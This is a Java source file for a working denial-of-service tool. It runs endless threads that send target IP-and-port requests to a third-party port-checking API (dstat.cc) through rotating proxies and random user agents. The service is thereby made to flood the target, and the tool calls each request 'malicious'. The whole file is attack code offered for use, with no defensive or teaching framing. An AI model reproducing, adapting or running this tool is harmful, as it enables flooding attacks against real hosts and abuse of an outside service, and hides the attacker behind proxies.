package placeholder;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class Main {

    private static List<String> proxies = null;
    private static final List<String> user_agents = new ArrayList<>();

    private static final String endpoint = "https://dstat.cc/api/checkhost.php?q=port";
    private static final String userAgentsUrl = "https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt";
    private static String json = "{\"target\":\"%s\"}";

    private static final Random r = new Random();


    public static void main(String[] args) throws Exception{
        // args: threads ip port proxy-list
        final int threads = Integer.parseInt(args[0]), port = Integer.parseInt(args[2]);
        json = String.format(json, args[1] + ":" + port);
        proxies = Files.readAllLines(Paths.get(new File(args[3]).toURI()));
        loadAgents();
        for (int x = 0; x < threads; x++){
            new Thread(){
                @Override
                public void run() {
                    while(true){
                        try{
                            final String[] proxy = proxies.get(r.nextInt(proxies.size())).split(":");
                            final HttpURLConnection connection = (HttpURLConnection) new URL(endpoint).openConnection
                                    (new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxy[0], Integer.parseInt(proxy[1]))));
                            try(AutoCloseable autoCloseable = () -> connection.disconnect();){
                                connection.setRequestMethod("POST");
                                connection.addRequestProperty("Content-Type", "application/json");
                                connection.addRequestProperty("Accept", "application/json");
                                connection.addRequestProperty("User-Agent", user_agents.get(r.nextInt(user_agents.size())));
                                connection.setDoOutput(true);
                                connection.setConnectTimeout(7500);
                                try(OutputStream outputStream = connection.getOutputStream()){
                                    outputStream.write(json.getBytes(), 0 ,json.length());

                                    try(BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                                        final StringBuilder stringBuilder = new StringBuilder();
                                        String s;
                                        while ((s = reader.readLine()) != null) {
                                            stringBuilder.append(s + "\n");
                                        }
                                        System.out.println(json);
                                        System.out.println("Successfully sent malicious request to dstat.cc! ["+Thread.currentThread().getName()+"]");
                                        System.out.println(stringBuilder.toString());
                                        System.out.println();

                                    }

                                }
                            }
                        }catch (Exception e){
                           // e.printStackTrace();
                        }
                    }

                }
            }.start();
        }
    }

    protected static boolean loadAgents(){
        try{
            final HttpURLConnection connection = (HttpURLConnection) new URL(userAgentsUrl).openConnection();
            try(AutoCloseable autoCloseable = () -> connection.disconnect()){
                connection.addRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko");
                try(BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))){
                    String agent;
                    while((agent = reader.readLine()) != null){
                        user_agents.add(agent);
                    }
                    return true;
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return false;
    }

}